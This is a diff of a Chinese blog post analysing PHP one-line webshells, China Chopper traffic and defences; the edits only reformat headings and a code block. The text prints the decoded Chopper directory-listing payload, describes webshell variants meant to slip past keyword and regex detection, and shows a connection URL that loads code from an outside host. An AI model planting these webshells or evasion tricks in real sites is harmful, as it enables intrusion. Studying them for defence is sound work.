@@ -6,7 +6,7 @@ categories: 渗透测试
 tags: 渗透测试
 ---
 
-#1 前言
+# 1 前言
 
 在无法直接登陆目标系统的情况下，如果需要远程控制一台主机则必须满足以下两个条件：
 
@@ -46,9 +46,10 @@ tags: 渗透测试
 至此一句话webshell + “中国菜刀”成为国内黑客必备的利器组合。本文主要研究此种攻击方式及相应的防御方法。限于篇幅所限，本文主要聚焦于PHP环境。
 
 ---
-#2 经典一句话攻击方法
 
-##2.1 经典的PHP一句话webshell
+# 2 经典一句话攻击方法
+
+## 2.1 经典的PHP一句话webshell
 
 PHP是最常见的WEB服务端语言之一，PHP是解释型高级语言，编写简单。全球有80%以上的站点采用PHP作为web服务端语言，这些站点主要集中在中、小规模的站点，但也有少数大规模web应用使用，例如Facebook。
 
@@ -69,7 +70,7 @@ url编码后发送到目标主机即可执行，结果如下图所示：
 
 需要注意的是，一句话webshell可以插入到很多正常的php文件中来隐藏自己
 
-##2.2 webshell管理工具
+## 2.2 webshell管理工具
 
 中国菜刀 weevely quasibot altman
 
@@ -109,29 +110,33 @@ pass参数在eval中执行，eval会执行chr函数完成解码，解码后的�
 
 z0参数为base64编码，解码后格式化得到的内容为：
 
-	@ini_set("display_errors","0");
-	@set_time_limit(0);
-	@set_magic_quotes_runtime(0);
-	echo("->|");;
-	$D=base64_decode(get_magic_quotes_gpc()?stripslashes($_POST["z1"]):$_POST["z1"]); //z1参数为中国菜刀中点击查看的目录
-	$F=@opendir($D);  //打开目录
-	if($F==NULL){
-		echo("ERROR:// Path Not Found Or No Permission!");
-	}else{
-		$M=NULL;
-		$L=NULL;
-		while($N=@readdir($F)){  //读取目录
-			$P=$D."/".$N;
-			$T=@date("Y-m-d H:i:s",@filemtime($P));  //获取文件创建时间
-			@$E=substr(base_convert(@fileperms($P),10,8),-4);  //获取文件访问权限
-			$R="\t".$T."\t".@filesize($P)."\t".$E."";  //获取文件大小
-			if(@is_dir($P))$M.=$N."/".$R;
-			else $L.=$N.$R;
-		}
-		echo $M.$L;
-		@closedir($F);
-	};
-	echo("|<-");die();
+{% highlight php %}
+<?php
+@ini_set("display_errors","0");
+@set_time_limit(0);
+@set_magic_quotes_runtime(0);
+echo("->|");;
+$D=base64_decode(get_magic_quotes_gpc()?stripslashes($_POST["z1"]):$_POST["z1"]); //z1参数为中国菜刀中点击查看的目录
+$F=@opendir($D);  //打开目录
+if($F==NULL){
+	echo("ERROR:// Path Not Found Or No Permission!");
+}else{
+	$M=NULL;
+	$L=NULL;
+	while($N=@readdir($F)){  //读取目录
+		$P=$D."/".$N;
+		$T=@date("Y-m-d H:i:s",@filemtime($P));  //获取文件创建时间
+		@$E=substr(base_convert(@fileperms($P),10,8),-4);  //获取文件访问权限
+		$R="\t".$T."\t".@filesize($P)."\t".$E."";  //获取文件大小
+		if(@is_dir($P))$M.=$N."/".$R;
+		else $L.=$N.$R;
+	}
+	echo $M.$L;
+	@closedir($F);
+};
+echo("|<-");die();
+?>
+{% endhighlight %}
 
 **3、z1参数**
 
@@ -143,7 +148,7 @@ z0参数为base64编码，解码后格式化得到的内容为：
 
 中国菜刀的控制通道数据特征明显，比较容易使用中间网络设备检测到
 
-##2.3 经典一句话webshell攻击防御
+## 2.3 经典一句话webshell攻击防御
 
 在经典一句话webshell攻击方式中，攻击过程可分为两步：
 
@@ -163,7 +168,7 @@ z0参数为base64编码，解码后格式化得到的内容为：
 
 ---
 
-#3 一句话webshell的变种
+# 3 一句话webshell的变种
 
 检测webshell的技术设计有*关键字匹配*、*正则表达式*、*语法/语义分析*，前两种技术实现简单，在实际工程中被大量使用，是非常成熟的技术；第三种技术最先进最理想，但实现困难。现实中大部分防御技术都采用前两者。因此常见的变种技术都针对前两者。
 
@@ -182,7 +187,7 @@ z0参数为base64编码，解码后格式化得到的内容为：
 不同版本对上面几个函数的支持不同，例如PHP5.5之后取消了preg\_replace使用preg\_replace_callback代替
 
 
-##3.1 字符串执行函数
+## 3.1 字符串执行函数
 
 如2.1章所述，一句话webshell从语义上很简单“从HTTP请求中获取一个包含php代码的字符串”，执行这个字符串
 
@@ -233,7 +238,7 @@ create_function函数能够根据一个字符串创建函数，结合call\_user\
 注意，create_function创建的函数需要通过*call\_user\_func/call\_user\_func\_array\array\_map*这些函数调用
 
 
-##3.2 可变函数
+## 3.2 可变函数
 
 PHP支持可变函数的概念，如果一个变量后面有圆括号，则PHP将括号前面的变量当作一个函数来执行，例如
 
@@ -252,7 +257,7 @@ PHP会将$var变量当作"assert"函数来执行
 
 只要加上一定的字符串操作就可以隐藏特征，在实际的操作中非常灵活，可以使用任意字符串操作的函数进行字符串变化，当然也可以使用各种编解码的函数
 
-##3.3 其他技巧
+## 3.3 其他技巧
 
 **利用变量传递函数**
 
@@ -287,7 +292,7 @@ PHP会将$var变量当作"assert"函数来执行
 	连接URL为：shell.php?l=http://1.1.1.1/a
 
 
-##3.4 一些变种webshell分析
+## 3.4 一些变种webshell分析
 
 **webshell示例 1**
 
